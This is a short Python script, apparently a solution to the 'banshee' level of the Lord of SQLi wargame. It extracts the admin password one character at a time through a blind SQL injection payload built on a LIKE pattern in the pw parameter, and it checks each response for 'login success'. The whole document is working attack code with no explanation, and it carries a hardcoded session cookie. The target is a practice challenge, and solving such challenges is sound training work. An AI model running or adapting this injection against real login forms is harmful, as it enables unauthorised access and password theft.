# lordofsqli: banshee
# woanmeo11

import requests
from string import digits, ascii_lowercase

url = 'https://los.rubiya.kr/chall/banshee_ece938c70ea2419a093bb0be9f01a7b1.php'
cookies = {'PHPSESSID': 'tn610bhfuga5petuu89p999kpl'}

charset = digits + ascii_lowercase
passwd = ''

finish = False
while not finish:
    finish = True
    for c in charset:
        print(c, end='', flush=True)

        payload = {'pw': f"' or id='admin' and pw like '{passwd + c}%"}
        r = requests.get(url, payload, cookies=cookies)
    
        with open('a.html', 'w') as f:
            f.write(r.text)

        if 'login success' in r.text:
            passwd += c
            finish = False
            print('\n->' + passwd)
            break

print('\n->' + passwd)
